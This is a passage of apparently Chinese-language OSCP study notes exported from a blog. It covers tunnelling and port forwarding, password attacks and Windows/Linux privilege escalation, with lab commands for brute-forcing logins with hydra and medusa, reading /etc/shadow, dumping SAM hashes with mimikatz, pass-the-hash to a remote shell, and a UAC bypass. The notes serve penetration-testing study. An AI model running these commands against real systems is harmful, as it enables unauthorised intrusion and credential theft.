class="hljs-number">0.0.0.0</span> <span class="hljs-number">80</span> <span class="hljs-number">216</span>.<span class="hljs-number">58</span>.<span class="hljs-number">207</span>.<span class="hljs-number">142</span> <span class="hljs-number">80</span><br>...<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><h3 id="SSH隧道-1"><a href="#SSH隧道-1" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><ul><li>SSH本地端口转发<ul><li>从Kali连接被控的Liunx主机, 建立SSH隧道, 将Kali本地端口映射到内网主机端口<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818202807.png"></li></ul></li></ul><h3 id="SSH本地端口转发"><a href="#SSH本地端口转发" class="headerlink" title="SSH本地端口转发"></a>SSH本地端口转发</h3><ul><li><p>场景介绍</p><ul><li>被控主机: 10.11.0.128</li><li>内网主机: 192.168.1.110(Windows 2016)</li><li><code>kali@kali:~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128</code></li></ul></li><li><p>因为 Windows Server 2016默认不再支持 SMBv1, 所以在建立隧道之前, 需要修改Samba的服务配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali@kali:~$ sudo nano /etc/samba/smb.conf<br>kali@kali:~$ <span class="hljs-built_in">cat</span> /etc/samba/smb.conf<br>...<br>Please note that you also need to <span class="hljs-built_in">set</span> appropriate Unix permissions<br><span class="hljs-comment"># to the drivers directory for these users to have write rights in it ; write list = root, @lpadmin</span><br>min protocol = SMB2<br>kali@kali:~$ sudo /etc/init.d/smbd restart<br>[ ok ] Restarting smbd (via systemctl): smbd.service.<br></code></pre></td></tr></table></figure></li><li><p>查看Windows 2016开启的文件共享</p><ul><li><code>kali@kali:~# smbclient -L 127.0.0.1 -U Administrator</code></li><li><code>kali@kali:~# smbclient -L \\\\10.11.0.128</code></li><li><code>kali@kali:~# smbclient -L \\\\10.11.0.128\\data</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818203820.png"></li></ul></li></ul><h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h3><ul><li>由远程被控主机反向连接Kali, 建立SSH隧道, 将Kali本地端口映射到内网主机端口<ul><li>适用于被控主机允许出站访问, 且未获得ROOT权限的场景<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818203949.png"></li></ul></li></ul><h3 id="Recon-ng"><a href="#Recon-ng" class="headerlink" title="Recon-ng"></a>Recon-ng</h3><ul><li>建立远程端口转发隧道, 重定向访问目标MySQL服务; 侦听端口为2221</li><li>场景介绍<ul><li>Kali: 10.11.0.4</li><li>MySQL: 被控主机本地侦听</li><li><code>student@debian:~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4</code></li></ul></li><li>通过隧道扫描目标MySQL服务<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818204415.png"></li></ul><h3 id="动态转口转发"><a href="#动态转口转发" class="headerlink" title="动态转口转发"></a>动态转口转发</h3><ul><li>建立隧道<ul><li><code>kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128</code></li></ul></li><li>挂上proxychain<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818204948.png"></li></ul><h3 id="Plink"><a href="#Plink" class="headerlink" title="Plink"></a>Plink</h3><ul><li>基于Windows系统SSH隧道&#x2F;端口转发</li><li>上传plink到.exe到目标被控主机</li><li>建立反向端口转发, 使Kali可以访问被控本地MySQL服务<ul><li><code> C:\Tools\port_redirection_and_tunneling&gt; plink.exe -ssh -l kali -pw ilak -R 10.11.0.4: 1234:127.0.0.1:3306 10.11.0.4</code></li><li>注意密码要倒置 kali &#x3D;&gt; ilak</li></ul></li></ul><h3 id="NETSH"><a href="#NETSH" class="headerlink" title="NETSH"></a>NETSH</h3><ul><li><p>端口转发</p><ul><li><code>C:\Windows\system32&gt; netsh interface portproxy add v4tov4 listenport=4455 listenaddres s=10.11.0.22 connectport=445 connectaddress=192.168.1.110</code></li></ul></li><li><p>验证端口是否开启<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818214245.png"></p></li><li><p>修改防火墙规则, 开放4455端口</p><ul><li><code>C:\Windows\system32&gt; netsh advfirewall firewall add rule name=&quot;forward_port_rule&quot; prot ocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow</code></li></ul></li><li><p>访问内网windows 2016 445端口SMB共享</p><ul><li><code>kali@kali:~$ cat /etc/samba/smb.conf</code></li><li><code>min protocol = SMB2</code></li><li><code>kali@kali:~$ sudo /etc/init.d/smbd restart</code></li><li><code>kali@kali:~$ smbclient -L 10.11.0.22 --port=4455 --user=Administrator</code></li></ul></li><li><p>挂载访问共享文件夹<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818215246.png"></p></li></ul><h2 id="HTTPTunnel-ing"><a href="#HTTPTunnel-ing" class="headerlink" title="HTTPTunnel-ing"></a>HTTPTunnel-ing</h2><h3 id="深层包检测"><a href="#深层包检测" class="headerlink" title="深层包检测"></a>深层包检测</h3><ul><li><p>深层包检测设备(FW&#x2F;IPS&#x2F;IDS)可能只允许指定协议的流量通过, 例如HTTP&#x2F;HTTPS</p><ul><li>禁止SSH协议流量, 因此基于SSH协议的隧道将失败</li></ul></li><li><p>HTTPTunnel 利用HTTP协议封装其他协议的流量</p><ul><li>C&#x2F;S架构, 通信双方都需要安装</li></ul></li><li><p>安装HTTPTunnel</p><ul><li><code>kali@kali:~$ sudo apt install httptunnel</code></li></ul></li><li><p>Kali:8080 &#x3D;&gt; Linux:1234 &#x3D;&gt; Linux:8888 &#x3D;&gt; windows2016:3389</p><ul><li>前一段是HTTP隧道</li><li>内网部分是SSH本地端口转发隧道<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818220248.png"></li></ul></li><li><p>在被控Linux和Windows2016之间建立内网SSH本地端口转发隧道</p><ul><li><code>www-data@debian:/$ ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1</code></li></ul></li><li><p>在被控主机上建立HTTP隧道服务端, 转发本机1234到8888端口</p><ul><li><code>student@debian:~$ hts --forward-port localhost:8888 1234</code></li></ul></li><li><p>在Kali与被控主机之间建立HTTP隧道</p><ul><li><code>kali@kali:~$ htc --forward-port 8080 10.11.0.128:1234</code></li></ul></li><li><p>直接RDP访问Windows 2016</p><ul><li><code>rdesktop 127.0.0.1:8080</code></li></ul></li></ul><h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><ul><li><p><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p></li><li><p>目前项目已经停止更新</p></li><li><p><a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p></li><li><p>-s 指定协议 -l 本地端口</p></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221029155311186.png" alt="ew基本使用"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221029155348038.png" alt="远程win主机上传win版本"></p><ul><li>win端使用 -d 远程地址 -e 远程端口</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221029155709720.png" alt="win端启用"></p><ul><li>建立连接</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221029155757819.png" alt="成功建立连接"></p><ul><li>对内网主机进行探测</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221029172319625.png" alt="namp扫描"></p><p><strong>由于socket代理不支持icmp协议 所以默认参数走不通 ping不通</strong></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221029172636480.png" alt="通过代理可以成功访问内网中主机"></p>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码攻击</title>
    <link href="/2022/08/18/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    <url>/2022/08/18/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h3 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h3><ul><li>十次成功的渗透测试至少七次于密码攻击有关</li><li>基于常用密码字典的攻击, 时间可控；纯暴力破解不现实</li><li>获得基础访问权限后, 进一步提取密码HASH(明文、PtH碰撞)</li><li>通过信息收集直接获取账号密码</li></ul><h2 id="密码字典"><a href="#密码字典" class="headerlink" title="密码字典"></a>密码字典</h2><h3 id="密码字典-1"><a href="#密码字典-1" class="headerlink" title="密码字典"></a>密码字典</h3><ul><li><p>Kali包含的密码字典</p><ul><li><code>/usr/share/wordlists</code></li><li><code>/usr/share/seclist</code></li></ul></li><li><p>专属密码字典</p><ul><li>通过添加特定目标组织的单词和短语来提高单词列表的实效性</li><li>向字典中添加特定企业的技术、产品名称、变形, 提高其有效性</li><li>使用cewl等工具生成专属字典</li><li><code>kali@kali:~$ cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt # 最小6个字符</code></li></ul></li><li><p>密码规则, leet -&gt; 1337变形</p></li><li><p>john可以按照规则自动生成字典, 并根据规则变形密码</p></li><li><p>添加规则, 在每个密码结尾加2个数字<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818184452.png"></p></li><li><p>使用规则变形密码, 执行破解</p><ul><li><code>kali@kali:~$ john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt</code></li></ul></li></ul><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ul><li>所有字符组合的纯密码爆破不现实</li><li>按指定长度和字符组合规则来生成爆破密码字典(1大写+2小写+2符号+3数字)<ul><li><code>kali@kali:~$ crunch 8 8 -t ,@@^^%%%</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818184741.png"></li></ul></li><li>生成4-6字节hex字符密码爆破字典<ul><li><code>kali@kali:~$ crunch 4 6 0123456789ABCDEF -o crunch.txt</code></li></ul></li><li>指定字符集生成密码字典<ul><li><code>kali@kali:~$ crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt # 我们可以指定字符集文件的路径（-f /usr/share/crunch/charset.lst）并选择混合字母集mixalpha，其中包括所有小写和大写字母</code></li></ul></li></ul><h2 id="在线密码破解"><a href="#在线密码破解" class="headerlink" title="在线密码破解"></a>在线密码破解</h2><h3 id="在线密码破解-1"><a href="#在线密码破解-1" class="headerlink" title="在线密码破解"></a>在线密码破解</h3><ul><li>流量巨大</li><li>日志会记录大量失败尝试</li><li>账号被锁定机制</li></ul><h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><ul><li>执行密码爆破<ul><li><code>kali@kali:~$ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin</code></li></ul></li></ul><h3 id="Crowbar"><a href="#Crowbar" class="headerlink" title="Crowbar"></a>Crowbar</h3><ul><li>支持的协议类型有限</li><li>支持SSH公钥认证破解, 和Windows系统的RDP密码破解</li><li><code>kali@kali:~$ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1</code></li></ul><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><ul><li>很猛</li><li>爆破ssh密码<ul><li><code>kali@kali:~$ hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1</code></li></ul></li><li>HTTP POST方法密码破解<ul><li><code>kali@kali:~$ hydra http-form-post -U # 查看模块用法</code></li></ul></li></ul><ol><li>确定身份认证URL</li><li>查看源码, 了解表单内容</li><li>确定判断条件字符串(失败时现实 “INVALID LOGIN”)</li></ol><ul><li><code>kali@kali:~$ hydra 10.11.0.22 http-form-post &quot;/form/frontpage.php:user=admin&amp;pass=^PAS S^:INVALID LOGIN&quot; -l admin -P /usr/share/wordlists/rockyou.txt -vV -f</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818185523.png"></li></ul><h2 id="哈希攻击"><a href="#哈希攻击" class="headerlink" title="哈希攻击"></a>哈希攻击</h2><h3 id="哈希攻击-1"><a href="#哈希攻击-1" class="headerlink" title="哈希攻击"></a>哈希攻击</h3><ul><li>密码通常以单向加密的HASH值形式存储与数据库中</li><li>HASH类型<ul><li>Openwall 提供HASH类型的识别功能(长度、字符类型、算法特殊符号)</li><li><code>http://openwall.info/wiki/john/sample-hashes</code></li></ul></li><li>在线查找、破解HASH值</li><li>Hashid识别工具<ul><li><code>kali@kali:~$ hashid c43ee559d69bc7f691fe2fbfe8a5ef0a</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818185946.png"></li></ul></li></ul><h3 id="Linux密码哈希"><a href="#Linux密码哈希" class="headerlink" title="Linux密码哈希"></a>Linux密码哈希</h3><ul><li>分析识别Linux系统账号的密码结构<ul><li><code>kali@kali:~$ sudo grep root /etc/shadow</code></li><li><code>root:$6$Rw99zZ2B$AZwfboPWM6z2tiBeK.EL74sivucCa8YhCrXGCBoVdeYUGsf8iwNxJkr.wTLDjI5poygaU cLaWtP/gewQkO7jT/:17564:0:99999:7:::</code></li></ul></li><li>密码部分构成<ul><li>$6: SHA-512算法</li><li>$Rw99zZ2B: 加盐(随机值), 结合明文密码生成密码密文</li><li><a href="https://www.slashroot.in/how-are-passwords-stored-linux-understanding-hashing-shadow-utils">https://www.slashroot.in/how-are-passwords-stored-linux-understanding-hashing-shadow-utils</a></li></ul></li></ul><h3 id="Windows密码哈希"><a href="#Windows密码哈希" class="headerlink" title="Windows密码哈希"></a>Windows密码哈希</h3><ul><li>Windows系统账号的密码存储于SAM文件中<ul><li>为防止离线密码破解, 从NT4.0 SP3开始引入SYSKEY加密SAM文件;</li></ul></li><li>NT&#x3D;&gt; Windows 2003 包含两种密码HASH &#x3D;&gt; LM(DES)、NTLM(MD4)</li><li>Windows内核独占锁定SAM数据库, 运行过程中无法拷贝SAM文件<ul><li>mimikatz可以DUMP HASH</li></ul></li><li>由于LSASS是一个以SYSTEM用于运行的特权进程, 因此mimikatz需要管理员权限才能提取其中的HASH</li></ul><h3 id="使用mimikatz读取Windows密码哈希"><a href="#使用mimikatz读取Windows密码哈希" class="headerlink" title="使用mimikatz读取Windows密码哈希"></a>使用mimikatz读取Windows密码哈希</h3><ul><li><code>C:\&gt; C:\Tools\password_attacks\mimikatz.exe</code></li><li><code>mimikatz # privilege::debug</code><ul><li>启用修改另一个进程所需的 SeDebugPrivilge 访问权限。如果失败, 则说明非管理员权限</li></ul></li><li><code>mimikatz # token::elevate</code><ul><li>从高完整性级别提升为SYSTEM完整性级别</li></ul></li><li><code>mimikatz # lsadump::sam</code></li></ul><h3 id="PtH攻击"><a href="#PtH攻击" class="headerlink" title="PtH攻击"></a>PtH攻击</h3><ul><li>Windows系统密码不加盐, 所以可以直接用HASH登录</li><li>利用一台计算机获得的HASH去碰撞内网其他主机 &#x3D;&gt; PASS THE HASH</li><li>通过SMB协议PtH执行系统命令</li><li>PtH执行CMD命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd<br>E_md4hash wrapper called.<br>HASH PASS: Substituting user supplied NTLM HASH...<br>Microsoft Windows [Version 10.0.16299.309]<br>(c) 2017 Microsoft Corporation. All rights reserved.<br>C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure></li></ul><h3 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a>Linux密码破解</h3><ul><li>生成破解文件<ul><li><code>kali@kali:~$ unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt</code></li><li><code>kali@kali:~$ john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</code></li></ul></li><li>HASHCAT支持CPU+GPU计算, 支持算法识别和字典变形处理<ul><li><code>C:\Users\Cracker\hashcat-4.2.1&gt; hashcat64.exe -b # 测量GPU计算能力</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818201403.png"></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>本地提权</title>
    <link href="/2022/08/18/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
    <url>/2022/08/18/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h3 id="本地权限"><a href="#本地权限" class="headerlink" title="本地权限"></a>本地权限</h3><ul><li>突破边界后通常获得低权限账号, 为获得目标系统全面控制能力需要提权</li><li>常见提权思路<ol><li>服务配置错误</li><li>文件或服务权限管理</li><li>内核漏洞</li><li>高权限运行的服务漏洞</li><li>敏感信息泄漏</li><li>总是在执行二进制文件之前提升特权的系统配置</li><li>脚本中包含硬编码的凭证, 以及许多其他内容</li></ol></li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>发现提权的可能途径, 包括手动以及自动信息收集和枚举技术</li><li>Liunx提权<ul><li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li></ul></li><li>Windows提权<ul><li><a href="https://www.fuzzysecurity.com/tutorials/16.html">https://www.fuzzysecurity.com/tutorials/16.html</a></li></ul></li></ul><h3 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h3><ul><li><p>枚举用户账号</p><ul><li>whoami</li></ul></li><li><p>Linux系统</p><ul><li>id</li><li>who</li><li>w<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818141321.png"></li></ul></li><li><p>查看Linux系统所有账号</p><ul><li><code>cat /etc/passwd |grep -v &#39;nologin\|false&#39;</code></li></ul></li><li><p>识别主机名</p><ul><li><code>hostname</code></li><li>通过命名规则(dc db web)推测这个网络中存在的其他主机</li></ul></li><li><p>枚举操作系统版本和架构</p><ul><li><code>C:\Users\student&gt;systeminfo</code></li><li><code>student@debian:~$ cat /etc/*-release</code></li><li><code>student@debian:~$ cat /etc/issue</code></li><li><code>student@debian:~$ uname -a</code></li></ul></li><li><p>枚举进程、服务</p><ul><li><code>C:\Users\student&gt;tasklist /SVC</code></li><li><code>student@debian:~$ ps aux</code></li></ul></li><li><p>枚举网络信息</p><ul><li>网卡配置、路由、开放端口、可发现内网网段、主机, 以其为跳板攻击不对外网开放的内部主机</li><li>通过特殊的虚拟网卡名称, 可发现其位于虚拟化或容器环境</li><li>通过开放端口发现运行的服务</li><li><code>C:\Users\student&gt;ipconfig /all</code></li><li><code>C:\Users\student&gt;route print</code></li><li><code>C:\Users\student&gt;netstat -ano</code></li><li><code>student@debian:~$ ip a</code></li><li><code>student@debian:~$ /sbin/route</code></li><li><code>student@debian:~$ ss -anp</code></li><li><code>student@debian:~$ netstat -pantulo</code></li></ul></li><li><p>枚举防火墙状态以及规则</p><ul><li>通过防火墙规则可以发现本地侦听的服务, 尝试发现其中漏洞进行提权</li><li>发现入站、出站过滤规则、端口转发、隧道、利用其发现内网</li><li><code>C:\Users\student&gt;netsh advfirewall show currentprofile  # FW配置文件</code></li><li><code>C:\Users\student&gt;netsh advfirewall firewall show rule name=all  # FW规则</code></li><li>Linux需要root查看系统防火墙(iptables)</li><li>普通用户可查看规则部分, Debain Linux FW规则位于&#x2F;etc&#x2F;iptables目录中, 普通用户可查看</li><li>搜索由iptables-save创建的文件(dump防火墙规则), 若文件权限有漏洞, 可查看</li></ul></li><li><p>枚举调度任务</p><ul><li>调度任务常用于执行用户创建的可执行文件或脚本</li><li><code>c:\Users\student&gt;schtasks /query /fo LIST /v</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818160212.png"></li></ul></li><li><p>Linux系统调度任务(Cron)</p><ul><li><code>student@debian:~$ ls -lah /etc/cron*</code></li><li><code>student@debian:~$ cat /etc/crontab</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818160728.png"></li></ul></li></ul><h3 id="枚举安装软件及布丁"><a href="#枚举安装软件及布丁" class="headerlink" title="枚举安装软件及布丁"></a>枚举安装软件及布丁</h3><ul><li>WMI无法发现未通过Windows Installer安装的程序<ul><li><code>c:\Users\student&gt;wmic product get name, version, vendor</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818161228.png"></li></ul></li><li>wmic 可通过查询Win32_QuickFixEngineering(qfe)类, 列出系统范围的更新<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818161209.png"></li><li>结合HotFixId InstalledOn的时间以了解windows系统的安全状态</li><li>Linux发行版不同, 使用的包管理软件也不同<ul><li>Debian-based &#x3D;&gt; apt</li><li>Read Hat-based &#x3D;&gt; rpm</li></ul></li><li>Debain Linux列出已安装的包<ul><li><code>student@debian:~$ dpkg -l</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818161616.png"></li></ul></li></ul><h3 id="枚举可读写的文件和目录"><a href="#枚举可读写的文件和目录" class="headerlink" title="枚举可读写的文件和目录"></a>枚举可读写的文件和目录</h3><ul><li>对特权账号执行的脚本和程序拥有写权限时, 可对其修改, 注入提权代码</li><li>Windows下<ul><li><code>c:\Tools\privilege_escalation\SysinternalsSuite&gt;accesschk.exe -uws &quot;Everyone&quot; &quot;C:\Prog ram Files&quot;</code></li><li><code>PS C:\Tools\privilege_escalation\SysinternalsSuite&gt;Get-ChildItem &quot;C:\Program Files&quot; -R ecurse | Get-ACL | ?&#123;$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;&#125;</code></li></ul></li><li>Linux下<ul><li><code>student@debian:~$ find / -writable -type d 2&gt;/dev/null</code></li></ul></li></ul><h3 id="枚举挂载的磁盘"><a href="#枚举挂载的磁盘" class="headerlink" title="枚举挂载的磁盘"></a>枚举挂载的磁盘</h3><ul><li>枚举为挂在的磁盘分区, 未挂载的分区中可能包含机密信息<ul><li><code>c:\Users\student&gt;mountvol</code></li><li><code>student@debian:~$ cat /etc/fstab</code></li><li><code>student@debian:~$ mount</code></li><li><code>student@debian:~$ /bin/lsblk</code></li></ul></li><li>枚举设备驱动和内核模块<ul><li><code>PS C:\Users\student&gt; driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Dis play Name’, ‘Start Mode’, Path</code></li></ul></li><li>查询驱动的数字签名(针对发现的驱动版本搜索已知漏洞)<ul><li><code>PS C:\Users\student&gt; Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, D riverVersion, Manufacturer | Where-Object &#123;$_.DeviceName -like &quot;*VMware*&quot;&#125;</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818163031.png"></li></ul></li><li>Linux系统查看已加载的内核模块信息(针对发现的驱动版本搜索已知漏洞)<ul><li><code>student@debian:~$ lsmod</code></li><li><code>student@debian:~$ /sbin/modinfo libata</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818163127.png"></li></ul></li></ul><h3 id="枚举自动提升权限的二进制文件"><a href="#枚举自动提升权限的二进制文件" class="headerlink" title="枚举自动提升权限的二进制文件"></a>枚举自动提升权限的二进制文件</h3><ul><li><p>在 Windows系统上，我们应该检查 AlwaysInstallElevated488 注册表设置的状态。如果在 HKEY_CURRENT_USER 或 HKEY_LOCAL_MACHINE 中启用了此键（设置为 1），则任何用户都可以使用提升的权限运行 Windows 安装程序包。</p></li><li><p><code>c:\Users\student&gt;reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Insta ller</code></p></li><li><p><code>c:\Users\student&gt;reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Inst aller</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818163327.png"></p></li><li><p>Linux搜索具有SUID权限的文件</p><ul><li>启用SUID的程序文件会用属主的权限运行, 如果是root则可以用于提权</li><li><code>student@debian:~$ find / -perm -u=s -type f 2&gt;/dev/null</code></li><li>如果&#x2F;bin&#x2F;cp文件启用了SUID权限, 则可以利用它拷贝覆盖&#x2F;etc&#x2F;passwd</li><li><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li></ul></li></ul><h3 id="自动枚举"><a href="#自动枚举" class="headerlink" title="自动枚举"></a>自动枚举</h3><ul><li>自动枚举提升效率</li><li>windows-privesc-check<ul><li><code>c:\Tools\privilege_escalation\windows-privesc-check-master&gt;windows-privesc-check2.exe --dump -G</code></li><li><code>student@debian:~$ ./unix-privesc-check standard &gt; output.txt</code></li></ul></li></ul><h2 id="Windows提权练习"><a href="#Windows提权练习" class="headerlink" title="Windows提权练习"></a>Windows提权练习</h2><h3 id="Windows特权和完整性级别"><a href="#Windows特权和完整性级别" class="headerlink" title="Windows特权和完整性级别"></a>Windows特权和完整性级别</h3><ul><li><p>Windows安全控制措施 特权、完整性级别、UAC</p></li><li><p>特权</p><ul><li>许可指定账号执行系统相关操作(包括修改文件系统、添加账号、关闭系统等)</li><li>身份认证成功后, windows系统会授予用户访问令牌。令牌包含很多信息用于描述用户的安全上下文, 其中包括用户的特权</li></ul></li><li><p>完整性级别</p><ul><li>除了令牌, Windows也使用完整性机制(integrity mechanism)这是 Windows 安全体系结构的核心组件，通过将完整性级别分配给应用程序进程和安全对象来工作</li><li>描述了信任级别操作系统具有正在运行的应用程序或安全对象。例如，配置的完整性级别规定了应用程序可以执行的操作，包括读取或写入本地文件系统的能力</li></ul></li><li><p>从 Windows Vista 开始，进程在四个完整性级别上运行</p><ol><li>系统完整性过程：SYSTEM权限</li><li>高完整性流程：administrative权限</li><li>中等完整性过程：标准用户权限</li><li>低完整性进程：沙盒进程中经常使用的权限非常有限<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818173820.png"></li></ol></li></ul><h3 id="UAC用户访问控制"><a href="#UAC用户访问控制" class="headerlink" title="UAC用户访问控制"></a>UAC用户访问控制</h3><ul><li>默认中安全级别执行更改密码会操作时报(管理员账号)<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818174009.png"></li><li>管理员也需要切换为高完整性权限才可以修改自身密码<ul><li><code>C:\Users\admin&gt;powershell.exe Start-Process cmd.exe -Verb runAs</code></li></ul></li></ul><h3 id="提权练习-1-UAC绕过"><a href="#提权练习-1-UAC绕过" class="headerlink" title="提权练习-1 UAC绕过"></a>提权练习-1 UAC绕过</h3><ul><li>允许管理员用户通过静默方式将完整性级别从中等提升到高, 绕过UAC</li><li>大多数UAC绕过技术只针对特定版本(Win10 build 1709)</li><li>负责管理操作系统中的语言更该, 默认运行于高完整性级别, 无需管理员权限即可修改注册表项, 实现以高完整性级别运行程序<ul><li>设置 &#x3D;&gt; 系统 &#x3D;&gt; 应用于功能 &#x3D;&gt; 管理可选功能 (<code>C:\Windows\System32\fodhelper.exe</code>)</li></ul></li><li>使用sigcheck查看fodhelper.exe<ul><li><code>C:\Tools\privilege_escalation\SysinternalsSuite&gt; sigcheck.exe -a -m C:\Windows\System3 2\fodhelper.exe</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818174918.png"></li></ul></li></ul><h3 id="权限提升-2-文件权限漏洞"><a href="#权限提升-2-文件权限漏洞" class="headerlink" title="权限提升-2 文件权限漏洞"></a>权限提升-2 文件权限漏洞</h3><ul><li>以SYSTEM运行的服务程序, 若文件系统权限允许任何人修改, 则可利用提权</li><li>查询所有服务进程路径<ul><li><code>PS C:\Users\student&gt; Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object &#123;$_.State -like &#39;Running&#39;&#125;</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818181343.png"></li></ul></li><li>查看执行程序的文件系统权限<ul><li><code>C:\Users\student&gt; icacls &quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;  # -F 完全控制(替换文件)</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818181656.png"></li></ul></li></ul><h3 id="权限提升-3-利用未引用的服务路径"><a href="#权限提升-3-利用未引用的服务路径" class="headerlink" title="权限提升-3 利用未引用的服务路径"></a>权限提升-3 利用未引用的服务路径</h3><ul><li>服务程序路径中如果存在空格, 必须要双引号闭合</li><li>第三方软件服务通常位于C:\Program Files 路径, 若执行程序路径未被双引号闭合, 则可以向程序主目录、子目录写入替换程序文件, 实现提权</li><li>假设我们有一个服务存储在 C:\Program Files\My Program\My Service\service.exe 服务路径未用双引号闭合, 每当 Windows 启动服务时，它都会尝试从以下路径运行可执行文件<ul><li>C:\Program.exe</li><li>C:\Program 